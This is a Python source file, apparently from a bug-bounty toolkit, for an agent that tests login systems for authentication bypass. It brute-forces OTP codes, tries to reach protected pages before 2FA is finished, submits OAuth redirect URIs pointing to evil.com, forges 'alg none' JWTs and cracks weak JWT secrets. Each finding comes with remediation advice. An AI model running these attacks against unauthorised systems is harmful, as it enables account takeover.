"""
Authentication Bypass Tester Agent

Comprehensive authentication bypass testing agent that identifies critical vulnerabilities
in authentication implementations including:
- Two-Factor Authentication (2FA) bypass
- OAuth/OIDC exploitation
- JWT manipulation and bypass
- Session management flaws
- Password reset vulnerabilities
- Multi-factor authentication bypass
- Single Sign-On (SSO) exploitation
- Token replay attacks
- Authentication timing attacks
- Account takeover chains

This agent specializes in full account takeover (ATO) chains and high-severity
authentication vulnerabilities.

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import time
import hashlib
import hmac
import base64
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime, date
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class AuthBypassSeverity(Enum):
    """Authentication bypass vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class AuthBypassType(Enum):
    """Types of authentication bypass vulnerabilities."""
    # 2FA Bypass
    TWO_FA_RATE_LIMIT = "2FA_RATE_LIMIT_BYPASS"
    TWO_FA_RESPONSE_MANIPULATION = "2FA_RESPONSE_MANIPULATION"
    TWO_FA_DIRECT_ACCESS = "2FA_DIRECT_ENDPOINT_ACCESS"
    TWO_FA_CODE_REUSE = "2FA_CODE_REUSE"
    TWO_FA_BACKUP_CODE = "2FA_BACKUP_CODE_BRUTEFORCE"
    TWO_FA_API_BYPASS = "2FA_API_BYPASS"

    # OAuth Bypass
    OAUTH_REDIRECT_URI = "OAUTH_REDIRECT_URI_BYPASS"
    OAUTH_STATE_MISSING = "OAUTH_STATE_MISSING"
    OAUTH_CODE_REUSE = "OAUTH_AUTHORIZATION_CODE_REUSE"
    OAUTH_OPEN_REDIRECT = "OAUTH_OPEN_REDIRECT_CHAIN"
    OAUTH_IMPLICIT_FLOW = "OAUTH_IMPLICIT_FLOW_LEAK"

    # JWT Bypass
    JWT_ALGORITHM_NONE = "JWT_ALGORITHM_NONE"
    JWT_ALGORITHM_CONFUSION = "JWT_ALGORITHM_CONFUSION"
    JWT_WEAK_SECRET = "JWT_WEAK_SECRET"
    JWT_NO_SIGNATURE_CHECK = "JWT_NO_SIGNATURE_VALIDATION"

    # Session Management
    SESSION_FIXATION = "SESSION_FIXATION"
    SESSION_PREDICTABLE = "SESSION_PREDICTABLE_IDS"
    SESSION_TIMEOUT_BYPASS = "SESSION_TIMEOUT_BYPASS"
    COOKIE_SECURITY_WEAK = "COOKIE_SECURITY_WEAK"

    # Password Reset
    PASSWORD_RESET_TOKEN_LEAK = "PASSWORD_RESET_TOKEN_LEAK"
    PASSWORD_RESET_PREDICTABLE = "PASSWORD_RESET_PREDICTABLE_TOKEN"
    PASSWORD_RESET_HOST_INJECTION = "PASSWORD_RESET_HOST_INJECTION"
    PASSWORD_RESET_TOKEN_REUSE = "PASSWORD_RESET_TOKEN_REUSE"

    # Generic Auth
    AUTH_TIMING_ATTACK = "AUTH_TIMING_ATTACK"
    AUTH_RACE_CONDITION = "AUTH_RACE_CONDITION"


@dataclass
class AuthBypassFinding:
    """Represents an authentication bypass finding."""
    title: str
    severity: AuthBypassSeverity
    vuln_type: AuthBypassType
    description: str
    endpoint: str
    poc: str
    impact: str
    recommendation: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    bounty_estimate: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


@dataclass
class AuthBypassTestResult:
    """Result from an authentication bypass test."""
    test_name: str
    endpoint: str
    success: bool
    vulnerability_found: bool = False
    details: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None


class AuthenticationBypassTester:
    """
    Comprehensive Authentication Bypass Tester.

    Performs extensive testing of authentication mechanisms including:
    - 2FA bypass techniques (rate limiting, response manipulation, direct access)
    - OAuth/OIDC exploitation (redirect URI bypass, state parameter, code reuse)
    - JWT manipulation (algorithm confusion, weak secrets, header injection)
    - Session management flaws (fixation, predictable IDs, weak cookies)
    - Password reset vulnerabilities (token leaks, predictability, host injection)

    Usage:
        tester = AuthenticationBypassTester(
            base_url="https://example.com",
            login_endpoint="/api/login"
        )
        findings = tester.run_all_tests(username="test", password="test123")
    """

    # Common OTP/PIN lengths
    OTP_LENGTHS = [4, 6, 8]

    # Common weak JWT secrets
    WEAK_JWT_SECRETS = [
        'secret', 'password', 'secret123', 'jwt_secret', 'api_key',
        'your-256-bit-secret', 'your-secret-key', 'mysecret',
        'test', 'dev', 'debug', '1234', '12345', '123456',
        'admin', 'root', ''
    ]

    def __init__(self, base_url: str, login_endpoint: str = "/api/login",
                 timeout: int = 10, verify_ssl: bool = True):
        """
        Initialize the Authentication Bypass Tester.

        Args:
            base_url: Base URL of target application
            login_endpoint: Login endpoint path
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.base_url = base_url.rstrip('/')
        self.login_endpoint = login_endpoint
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.findings: List[AuthBypassFinding] = []
        self.test_results: List[AuthBypassTestResult] = []
        self.session = requests.Session()

    def run_all_tests(self, username: Optional[str] = None,
                     password: Optional[str] = None,
                     jwt_token: Optional[str] = None,
                     oauth_config: Optional[Dict[str, str]] = None) -> List[AuthBypassFinding]:
        """
        Run all authentication bypass tests.

        Args:
            username: Test account username
            password: Test account password
            jwt_token: JWT token for testing (optional)
            oauth_config: OAuth configuration dict (optional)

        Returns:
            List of all findings discovered
        """
        all_findings = []

        # 2FA bypass tests (require credentials)
        if username and password:
            all_findings.extend(self.test_2fa_bypass(username, password))

        # OAuth bypass tests
        if oauth_config:
            all_findings.extend(self.test_oauth_bypass(oauth_config))

        # JWT bypass tests
        if jwt_token:
            all_findings.extend(self.test_jwt_bypass(jwt_token))

        # Session management tests
        if username and password:
            all_findings.extend(self.test_session_management(username, password))

        # Password reset tests
        all_findings.extend(self.test_password_reset())

        self.findings.extend(all_findings)
        return all_findings

    # ============================================================================
    # 2FA BYPASS TESTS
    # ============================================================================

    def test_2fa_bypass(self, username: str, password: str) -> List[AuthBypassFinding]:
        """
        Test for 2FA bypass vulnerabilities.

        Tests include:
        - Rate limiting on OTP codes
        - Response manipulation
        - Direct endpoint access
        - Code reuse
        - API bypass
        """
        findings = []

        findings.extend(self._test_2fa_rate_limiting(username, password))
        findings.extend(self._test_2fa_response_manipulation(username, password))
        findings.extend(self._test_2fa_direct_access(username, password))
        findings.extend(self._test_2fa_api_bypass(username, password))

        return findings

    def _test_2fa_rate_limiting(self, username: str, password: str) -> List[AuthBypassFinding]:
        """Test for missing rate limiting on 2FA OTP codes."""
        findings = []

        try:
            # Attempt login
            login_url = f"{self.base_url}{self.login_endpoint}"
            response = self.session.post(
                login_url,
                json={'username': username, 'password': password},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # Check if 2FA is required
            if not self._is_2fa_required(response):
                return findings

            # Extract OTP endpoint
            otp_endpoint = self._extract_2fa_endpoint(response)
            if not otp_endpoint:
                return findings

            # Test rate limiting
            attempts = 0
            blocked = False
            start_time = time.time()

            for code in range(100):  # Test 100 attempts
                otp_code = f"{code:06d}"  # 6-digit code

                otp_response = self.session.post(
                    f"{self.base_url}{otp_endpoint}",
                    json={'otp': otp_code, 'code': otp_code},
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                attempts += 1

                # Check if rate limited
                if otp_response.status_code == 429:
                    blocked = True
                    break

                if 'rate limit' in otp_response.text.lower() or 'too many' in otp_response.text.lower():
                    blocked = True
                    break

            elapsed = time.time() - start_time

            if not blocked:
                # Calculate brute force time
                codes_per_second = attempts / elapsed if elapsed > 0 else 0
                total_codes = 1000000  # 1M 6-digit codes
                hours_to_crack = (total_codes / codes_per_second / 3600) if codes_per_second > 0 else 0

                finding = AuthBypassFinding(
                    title="2FA Bypass - Missing Rate Limiting on OTP Codes",
                    severity=AuthBypassSeverity.CRITICAL,
                    vuln_type=AuthBypassType.TWO_FA_RATE_LIMIT,
                    description=(
                        f"The 2FA OTP endpoint has no rate limiting. Tested {attempts} codes "
                        f"in {elapsed:.1f} seconds without being blocked. This allows brute force "
                        f"attacks on OTP codes."
                    ),
                    endpoint=otp_endpoint,
                    poc=self._generate_2fa_rate_limit_poc(otp_endpoint, attempts, elapsed, hours_to_crack),
                    impact=(
                        "An attacker can brute force 2FA OTP codes, bypassing two-factor authentication "
                        f"entirely. With {codes_per_second:.0f} attempts/sec, all 6-digit codes can be "
                        f"tested in ~{hours_to_crack:.1f} hours, leading to complete account takeover."
                    ),
                    recommendation=(
                        "Implement strict rate limiting on OTP verification endpoints: "
                        "- Max 3-5 failed attempts per session\n"
                        "- Account lockout after 10 failed attempts\n"
                        "- Progressive delays (exponential backoff)\n"
                        "- CAPTCHA after 3 failures\n"
                        "- IP-based rate limiting"
                    ),
                    evidence={
                        'attempts': attempts,
                        'elapsed_seconds': elapsed,
                        'codes_per_second': codes_per_second,
                        'estimated_crack_time_hours': hours_to_crack,
                        'endpoint': otp_endpoint
                    },
                    cwe_id="CWE-307",
                    cvss_score=9.1,
                    bounty_estimate="$5,000-$15,000"
                )
                findings.append(finding)

        except Exception as e:
            self.test_results.append(AuthBypassTestResult(
                test_name="2FA Rate Limiting",
                endpoint=self.login_endpoint,
                success=False,
                error=str(e)
            ))

        return findings

    def _test_2fa_response_manipulation(self, username: str, password: str) -> List[AuthBypassFinding]:
        """Test for client-side 2FA validation via response manipulation."""
        findings = []

        try:
            # Login
            login_url = f"{self.base_url}{self.login_endpoint}"
            response = self.session.post(
                login_url,
                json={'username': username, 'password': password},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if not self._is_2fa_required(response):
                return findings

            # Extract OTP endpoint
            otp_endpoint = self._extract_2fa_endpoint(response)
            if not otp_endpoint:
                return findings

            # Submit invalid OTP
            otp_response = self.session.post(
                f"{self.base_url}{otp_endpoint}",
                json={'otp': '000000', 'code': '000000'},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # Check if response contains client-side validation indicators
            response_text = otp_response.text.lower()
            response_json = None

            try:
                response_json = otp_response.json()
            except:
                pass

            # Look for validation response patterns
            client_side_indicators = [
                '"success": false',
                '"verified": false',
                '"valid": false',
                '"authenticated": false',
                '"status": "invalid"',
                '"2fa_verified": false'
            ]

            has_client_validation = any(indicator in response_text for indicator in client_side_indicators)

            if has_client_validation:
                finding = AuthBypassFinding(
                    title="2FA Bypass - Client-Side Response Validation",
                    severity=AuthBypassSeverity.CRITICAL,
                    vuln_type=AuthBypassType.TWO_FA_RESPONSE_MANIPULATION,
                    description=(
                        "The 2FA verification endpoint returns the validation result in the response "
                        "body, indicating potential client-side validation. An attacker can intercept "
                        "and modify the response to bypass 2FA verification."
                    ),
                    endpoint=otp_endpoint,
                    poc=self._generate_response_manipulation_poc(otp_endpoint),
                    impact=(
                        "An attacker can bypass 2FA by intercepting the HTTP response and modifying "
                        "the validation result from false to true. This completely negates the security "
                        "benefit of two-factor authentication."
                    ),
                    recommendation=(
                        "Never return 2FA validation results to the client. Implement server-side "
                        "session management:\n"
                        "- Store 2FA status in server-side session\n"
                        "- Redirect to authenticated page only after server validates OTP\n"
                        "- Use HTTP-only, secure session cookies\n"
                        "- Never trust client-provided validation status"
                    ),
                    evidence={
                        'response_body': otp_response.text[:500],
                        'response_json': response_json,
                        'indicators_found': [ind for ind in client_side_indicators if ind in response_text]
                    },
                    cwe_id="CWE-602",
                    cvss_score=9.8,
                    bounty_estimate="$8,000-$25,000"
                )
                findings.append(finding)

        except Exception as e:
            self.test_results.append(AuthBypassTestResult(
                test_name="2FA Response Manipulation",
                endpoint=self.login_endpoint,
                success=False,
                error=str(e)
            ))

        return findings

    def _test_2fa_direct_access(self, username: str, password: str) -> List[AuthBypassFinding]:
        """Test if protected endpoints are accessible without completing 2FA."""
        findings = []

        try:
            # Login (but don't complete 2FA)
            login_url = f"{self.base_url}{self.login_endpoint}"
            response = self.session.post(
                login_url,
                json={'username': username, 'password': password},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if not self._is_2fa_required(response):
                return findings

            # Try accessing protected endpoints without completing 2FA
            protected_endpoints = [
                '/api/user/profile',
                '/api/account',
                '/dashboard',
                '/api/settings',
                '/api/me',
                '/api/v1/user',
                '/api/v2/account'
            ]

            for endpoint in protected_endpoints:
                try:
                    endpoint_response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )

                    # Check if we got access (200 OK and not redirected to login)
                    if endpoint_response.status_code == 200:
                        # Check if response contains user data
                        try:
                            data = endpoint_response.json()
                            if any(key in data for key in ['user', 'account', 'profile', 'email', 'id']):
                                finding = AuthBypassFinding(
                                    title=f"2FA Bypass - Direct Access to {endpoint}",
                                    severity=AuthBypassSeverity.CRITICAL,
                                    vuln_type=AuthBypassType.TWO_FA_DIRECT_ACCESS,
                                    description=(
                                        f"The protected endpoint {endpoint} is accessible without "
                                        "completing 2FA verification. After initial login with valid "
                                        "credentials, the endpoint can be accessed directly, bypassing "
                                        "the 2FA requirement."
                                    ),
                                    endpoint=endpoint,
                                    poc=self._generate_direct_access_poc(endpoint),
                                    impact=(
                                        "An attacker with valid username/password can completely bypass "
                                        "2FA by directly accessing API endpoints after initial login. "
                                        "This allows full account access without the second factor."
                                    ),
                                    recommendation=(
                                        "Enforce 2FA verification across all authenticated endpoints:\n"
                                        "- Check 2FA completion status in session for every request\n"
                                        "- Redirect to 2FA page if not completed\n"
                                        "- Use middleware/guards to enforce 2FA globally\n"
                                        "- Set 2FA completion flag only after successful verification"
                                    ),
                                    evidence={
                                        'endpoint': endpoint,
                                        'status_code': endpoint_response.status_code,
                                        'response_preview': str(data)[:200]
                                    },
                                    cwe_id="CWE-288",
                                    cvss_score=9.1,
                                    bounty_estimate="$10,000-$30,000"
                                )
                                findings.append(finding)
                                break  # Found one, that's enough
                        except:
                            pass

                except:
                    continue

        except Exception as e:
            self.test_results.append(AuthBypassTestResult(
                test_name="2FA Direct Access",
                endpoint=self.login_endpoint,
                success=False,
                error=str(e)
            ))

        return findings

    def _test_2fa_api_bypass(self, username: str, password: str) -> List[AuthBypassFinding]:
        """Test if API endpoints bypass 2FA requirement."""
        findings = []

        api_endpoints = [
            '/api/v1/auth/login',
            '/api/v2/auth/login',
            '/api/auth/token',
            '/api/authenticate',
            '/graphql',
            '/api/login',
            '/api/v1/login'
        ]

        for endpoint in api_endpoints:
            try:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={'username': username, 'password': password},
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        # Check if we got a token without 2FA
                        if any(key in data for key in ['token', 'access_token', 'jwt', 'auth_token', 'session_token']):
                            finding = AuthBypassFinding(
                                title=f"2FA Bypass - API Endpoint {endpoint} Missing 2FA",
                                severity=AuthBypassSeverity.CRITICAL,
                                vuln_type=AuthBypassType.TWO_FA_API_BYPASS,
                                description=(
                                    f"The API endpoint {endpoint} issues authentication tokens "
                                    "without requiring 2FA verification. While the web interface "
                                    "enforces 2FA, the API allows direct authentication with just "
                                    "username and password."
                                ),
                                endpoint=endpoint,
                                poc=self._generate_api_bypass_poc(endpoint, username),
                                impact=(
                                    "An attacker with valid credentials can bypass 2FA entirely by "
                                    "authenticating through the API endpoint. This provides full account "
                                    "access without the second factor."
                                ),
                                recommendation=(
                                    "Enforce 2FA across ALL authentication endpoints:\n"
                                    "- API and web should have consistent auth requirements\n"
                                    "- Implement 2FA for API token generation\n"
                                    "- Consider API-specific 2FA flow (TOTP for API access)\n"
                                    "- Never exempt API endpoints from security controls"
                                ),
                                evidence={
                                    'endpoint': endpoint,
                                    'status_code': response.status_code,
                                    'token_keys_found': [k for k in data.keys() if 'token' in k.lower()],
                                    'response_preview': str(data)[:200]
                                },
                                cwe_id="CWE-306",
                                cvss_score=9.8,
                                bounty_estimate="$12,000-$35,000"
                            )
                            findings.append(finding)
                            break
                    except:
                        pass

            except:
                continue

        return findings

    # ============================================================================
    # OAUTH BYPASS TESTS
    # ============================================================================

    def test_oauth_bypass(self, oauth_config: Dict[str, str]) -> List[AuthBypassFinding]:
        """
        Test for OAuth/OIDC bypass vulnerabilities.

        Args:
            oauth_config: Dict with keys:
                - client_id: OAuth client ID
                - authorization_endpoint: OAuth authorization URL
                - redirect_uri: Legitimate redirect URI
        """
        findings = []

        findings.extend(self._test_oauth_redirect_uri_bypass(oauth_config))
        findings.extend(self._test_oauth_state_parameter(oauth_config))

        return findings

    def _test_oauth_redirect_uri_bypass(self, oauth_config: Dict[str, str]) -> List[AuthBypassFinding]:
        """Test for OAuth redirect_uri validation bypass."""
        findings = []

        client_id = oauth_config.get('client_id')
        auth_endpoint = oauth_config.get('authorization_endpoint')
        redirect_uri = oauth_config.get('redirect_uri')

        if not all([client_id, auth_endpoint, redirect_uri]):
            return findings

        parsed_redirect = urllib.parse.urlparse(redirect_uri)
        domain = parsed_redirect.netloc

        # Bypass patterns to test
        bypass_patterns = [
            f"https://evil.com?{redirect_uri}",
            f"https://evil.com#{redirect_uri}",
            f"https://evil.com/{domain}",
            f"https://{domain}.evil.com",
            f"https://{domain}@evil.com",
            f"{redirect_uri}.evil.com",
            f"{redirect_uri}/../evil.com",
            redirect_uri.replace('https://', 'https://evil.com@')
        ]

        for malicious_redirect in bypass_patterns:
            try:
                params = {
                    'client_id': client_id,
                    'redirect_uri': malicious_redirect,
                    'response_type': 'code',
                    'scope': 'openid profile email'
                }

                oauth_url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"

                response = requests.get(
                    oauth_url,
                    allow_redirects=False,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                # Check if malicious redirect was accepted
                location = response.headers.get('Location', '')

                if 'evil.com' in location or malicious_redirect in location:
                    finding = AuthBypassFinding(
                        title="OAuth Redirect URI Validation Bypass",
                        severity=AuthBypassSeverity.CRITICAL,
                        vuln_type=AuthBypassType.OAUTH_REDIRECT_URI,
                        description=(
                            f"OAuth redirect_uri validation can be bypassed using the pattern: "
                            f"{malicious_redirect}. This allows an attacker to redirect the "
                            "authorization code to an attacker-controlled domain."
                        ),
                        endpoint=auth_endpoint,
                        poc=self._generate_oauth_redirect_poc(oauth_url, malicious_redirect),
                        impact=(
                            "An attacker can steal OAuth authorization codes by tricking users into "
                            "clicking a malicious OAuth URL. The authorization code is sent to the "
                            "attacker's domain, allowing complete account takeover."
                        ),
                        recommendation=(
                            "Implement strict redirect_uri validation:\n"
                            "- Use exact string matching (not regex)\n"
                            "- Maintain whitelist of allowed redirect URIs\n"
                            "- Reject URIs with @ character\n"
                            "- Reject URIs with subdomain wildcards\n"
                            "- Validate scheme (https only)\n"
                            "- Use PKCE extension for additional security"
                        ),
                        evidence={
                            'bypass_pattern': malicious_redirect,
                            'location_header': location,
                            'oauth_url': oauth_url
                        },
                        cwe_id="CWE-601",
                        cvss_score=9.3,
                        bounty_estimate="$8,000-$20,000"
                    )
                    findings.append(finding)
                    break

            except:
                continue

        return findings

    def _test_oauth_state_parameter(self, oauth_config: Dict[str, str]) -> List[AuthBypassFinding]:
        """Test if OAuth state parameter is required (CSRF protection)."""
        findings = []

        client_id = oauth_config.get('client_id')
        auth_endpoint = oauth_config.get('authorization_endpoint')
        redirect_uri = oauth_config.get('redirect_uri')

        if not all([client_id, auth_endpoint, redirect_uri]):
            return findings

        try:
            # Test without state parameter
            params = {
                'client_id': client_id,
                'redirect_uri': redirect_uri,
                'response_type': 'code',
                'scope': 'openid profile email'
                # No state parameter
            }

            oauth_url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"

            response = requests.get(
                oauth_url,
                allow_redirects=False,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # If OAuth flow proceeds without state, it's vulnerable
            if response.status_code in [200, 302]:
                finding = AuthBypassFinding(
                    title="OAuth Missing State Parameter - CSRF Vulnerability",
                    severity=AuthBypassSeverity.HIGH,
                    vuln_type=AuthBypassType.OAUTH_STATE_MISSING,
                    description=(
                        "The OAuth authorization flow does not require the state parameter, "
                        "which is used for CSRF protection. This allows OAuth CSRF attacks."
                    ),
                    endpoint=auth_endpoint,
                    poc=self._generate_oauth_csrf_poc(oauth_url),
                    impact=(
                        "An attacker can perform OAuth CSRF attacks by tricking a victim into "
                        "completing an OAuth flow that links the victim's account to the attacker's "
                        "OAuth account. This can lead to account takeover or data exposure."
                    ),
                    recommendation=(
                        "Enforce state parameter validation:\n"
                        "- Require state parameter in all authorization requests\n"
                        "- Generate cryptographically random state values\n"
                        "- Bind state to user session\n"
                        "- Validate state parameter in callback\n"
                        "- Reject requests with missing or invalid state"
                    ),
                    evidence={
                        'oauth_url': oauth_url,
                        'status_code': response.status_code,
                        'state_required': False
                    },
                    cwe_id="CWE-352",
                    cvss_score=7.1,
                    bounty_estimate="$3,000-$8,000"
                )
                findings.append(finding)

        except:
            pass

        return findings

    # ============================================================================
    # JWT BYPASS TESTS
    # ============================================================================

    def test_jwt_bypass(self, jwt_token: str) -> List[AuthBypassFinding]:
        """
        Test for JWT bypass vulnerabilities.

        Tests include:
        - Algorithm 'none' bypass
        - Algorithm confusion (RS256→HS256)
        - Weak secret detection
        - Missing signature validation
        """
        findings = []

        findings.extend(self._test_jwt_algorithm_none(jwt_token))
        findings.extend(self._test_jwt_weak_secret(jwt_token))

        return findings

    def _test_jwt_algorithm_none(self, jwt_token: str) -> List[AuthBypassFinding]:
        """Test if JWT accepts algorithm 'none'."""
        findings = []

        try:
            parts = jwt_token.split('.')
            if len(parts) != 3:
                return findings

            # Decode header and payload
            header = json.loads(self._base64url_decode(parts[0]))
            payload = json.loads(self._base64url_decode(parts[1]))

            # Create token with alg=none
            modified_header = header.copy()
            modified_header['alg'] = 'none'

            # Create unsigned token
            header_b64 = self._base64url_encode(json.dumps(modified_header))
            payload_b64 = self._base64url_encode(json.dumps(payload))
            unsigned_token = f"{header_b64}.{payload_b64}."

            finding = AuthBypassFinding(
                title="JWT Algorithm 'none' Bypass - Test Required",
                severity=AuthBypassSeverity.CRITICAL,
                vuln_type=AuthBypassType.JWT_ALGORITHM_NONE,
                description=(
                    "JWT tokens that accept algorithm 'none' completely bypass signature "
                    "verification. This allows an attacker to forge arbitrary tokens without "
                    "knowing the signing key. Test the provided unsigned token."
                ),
                endpoint="JWT Validation",
                poc=self._generate_jwt_none_poc(unsigned_token, payload),
                impact=(
                    "Complete authentication bypass. An attacker can create tokens with any "
                    "claims (user ID, role, permissions) and gain full access to any account "
                    "without knowing credentials or signing keys."
                ),
                recommendation=(
                    "Reject tokens with algorithm 'none':\n"
                    "- Configure JWT library to reject alg=none\n"
                    "- Use strict algorithm validation\n"
                    "- Whitelist only expected algorithms (e.g., RS256, HS256)\n"
                    "- Never trust the alg header value alone"
                ),
                evidence={
                    'unsigned_token': unsigned_token,
                    'original_algorithm': header.get('alg'),
                    'modified_algorithm': 'none',
                    'payload': payload
                },
                cwe_id="CWE-347",
                cvss_score=9.8,
                bounty_estimate="$15,000-$50,000"
            )
            findings.append(finding)

        except:
            pass

        return findings

    def _test_jwt_weak_secret(self, jwt_token: str) -> List[AuthBypassFinding]:
        """Test for weak HMAC secrets via brute force."""
        findings = []

        try:
            parts = jwt_token.split('.')
            if len(parts) != 3:
                return findings

            header = json.loads(self._base64url_decode(parts[0]))
            payload = json.loads(self._base64url_decode(parts[1]))
            signature = parts[2]

            algorithm = header.get('alg', '').upper()

            # Only test HMAC algorithms
            if algorithm not in ['HS256', 'HS384', 'HS512']:
                return findings

            signing_input = f"{parts[0]}.{parts[1]}"

            # Try weak secrets
            for secret in self.WEAK_JWT_SECRETS:
                test_signature = self._generate_hmac_signature(signing_input, secret, algorithm)

                if test_signature == signature:
                    finding = AuthBypassFinding(
                        title=f"JWT Weak Secret Detected: '{secret}'",
                        severity=AuthBypassSeverity.CRITICAL,
                        vuln_type=AuthBypassType.JWT_WEAK_SECRET,
                        description=(
                            f"The JWT signing secret was cracked using a common wordlist. "
                            f"The secret is: '{secret}'. This allows an attacker to forge "
                            f"arbitrary tokens and completely bypass authentication."
                        ),
                        endpoint="JWT Validation",
                        poc=self._generate_jwt_weak_secret_poc(secret, payload, algorithm),
                        impact=(
                            "Complete authentication bypass. An attacker can forge tokens with "
                            "any user ID, role, or permissions. This allows full account takeover "
                            "of any user and complete system compromise."
                        ),
                        recommendation=(
                            "Use a cryptographically strong random secret:\n"
                            "- Minimum 256 bits (32 bytes) for HS256\n"
                            "- Generate using cryptographically secure RNG\n"
                            "- Never use common words, default values, or empty strings\n"
                            "- Rotate secrets regularly\n"
                            "- Consider using RS256 with public/private keypair"
                        ),
                        evidence={
                            'cracked_secret': secret,
                            'algorithm': algorithm,
                            'is_empty_secret': len(secret) == 0,
                            'payload': payload
                        },
                        cwe_id="CWE-798",
                        cvss_score=10.0,
                        bounty_estimate="$20,000-$50,000"
                    )
                    findings.append(finding)
                    break

        except:
            pass

        return findings

    # ============================================================================
    # SESSION MANAGEMENT TESTS
    # ============================================================================

    def test_session_management(self, username: str, password: str) -> List[AuthBypassFinding]:
        """
        Test for session management vulnerabilities.

        Tests include:
        - Session fixation
        - Predictable session IDs
        - Weak cookie security attributes
        """
        findings = []

        findings.extend(self._test_session_fixation(username, password))
        findings.extend(self._test_predictable_session_ids())
        findings.extend(self._test_cookie_security())

        return findings

    def _test_session_fixation(self, username: str, password: str) -> List[AuthBypassFinding]:
        """Test for session fixation vulnerability."""
        findings = []

        try:
            session = requests.Session()

            # Get session ID before login
            pre_login_response = session.get(
                f"{self.base_url}{self.login_endpoint}",
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            pre_login_cookies = session.cookies.get_dict()
            pre_login_session_id = (
                pre_login_cookies.get('JSESSIONID') or
                pre_login_cookies.get('session') or
                pre_login_cookies.get('sessionid') or
                pre_login_cookies.get('sid')
            )

            if not pre_login_session_id:
                return findings

            # Login
            session.post(
                f"{self.base_url}{self.login_endpoint}",
                json={'username': username, 'password': password},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # Get session ID after login
            post_login_cookies = session.cookies.get_dict()
            post_login_session_id = (
                post_login_cookies.get('JSESSIONID') or
                post_login_cookies.get('session') or
                post_login_cookies.get('sessionid') or
                post_login_cookies.get('sid')
            )

            # Check if session ID changed
            if pre_login_session_id == post_login_session_id:
                finding = AuthBypassFinding(
                    title="Session Fixation Vulnerability",
                    severity=AuthBypassSeverity.HIGH,
                    vuln_type=AuthBypassType.SESSION_FIXATION,
                    description=(
                        "Session ID is not regenerated after successful login. The same session "
                        "ID is used before and after authentication, allowing session fixation attacks."
                    ),
                    endpoint=self.login_endpoint,
                    poc=self._generate_session_fixation_poc(pre_login_session_id),
                    impact=(
                        "An attacker can fix a victim's session ID before login, then hijack "
                        "the session after the victim authenticates. This allows complete account "
                        "takeover without knowing the victim's credentials."
                    ),
                    recommendation=(
                        "Regenerate session ID on authentication:\n"
                        "- Generate new session ID after successful login\n"
                        "- Invalidate old session ID\n"
                        "- Also regenerate on privilege escalation\n"
                        "- Use framework's built-in session regeneration"
                    ),
                    evidence={
                        'pre_login_session_id': pre_login_session_id,
                        'post_login_session_id': post_login_session_id,
                        'ids_match': True
                    },
                    cwe_id="CWE-384",
                    cvss_score=7.5,
                    bounty_estimate="$4,000-$12,000"
                )
                findings.append(finding)

        except:
            pass

        return findings

    def _test_predictable_session_ids(self) -> List[AuthBypassFinding]:
        """Test if session IDs are predictable/sequential."""
        findings = []

        try:
            session_ids = []

            # Generate multiple sessions
            for _ in range(5):
                session = requests.Session()
                response = session.get(
                    f"{self.base_url}{self.login_endpoint}",
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                cookies = session.cookies.get_dict()
                session_id = (
                    cookies.get('JSESSIONID') or
                    cookies.get('session') or
                    cookies.get('sessionid') or
                    cookies.get('sid')
                )

                if session_id:
                    session_ids.append(session_id)

            if len(session_ids) >= 3:
                # Check for sequential numeric IDs
                try:
                    numeric_ids = [int(sid) for sid in session_ids]
                    differences = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]

                    if all(d == differences[0] for d in differences):
                        finding = AuthBypassFinding(
                            title="Predictable Session IDs - Sequential Pattern",
                            severity=AuthBypassSeverity.CRITICAL,
                            vuln_type=AuthBypassType.SESSION_PREDICTABLE,
                            description=(
                                f"Session IDs are sequential, incrementing by {differences[0]} each time. "
                                "An attacker can predict valid session IDs and hijack user sessions."
                            ),
                            endpoint=self.login_endpoint,
                            poc=self._generate_predictable_session_poc(session_ids),
                            impact=(
                                "An attacker can enumerate and predict valid session IDs, allowing "
                                "mass account takeover. All active sessions can be hijacked by "
                                "incrementing/decrementing from a known session ID."
                            ),
                            recommendation=(
                                "Use cryptographically random session IDs:\n"
                                "- Minimum 128 bits of entropy\n"
                                "- Use cryptographically secure random number generator\n"
                                "- Never use sequential, timestamp-based, or predictable IDs\n"
                                "- Use framework's built-in session management"
                            ),
                            evidence={
                                'session_ids': session_ids,
                                'increment': differences[0],
                                'pattern': 'sequential'
                            },
                            cwe_id="CWE-330",
                            cvss_score=9.8,
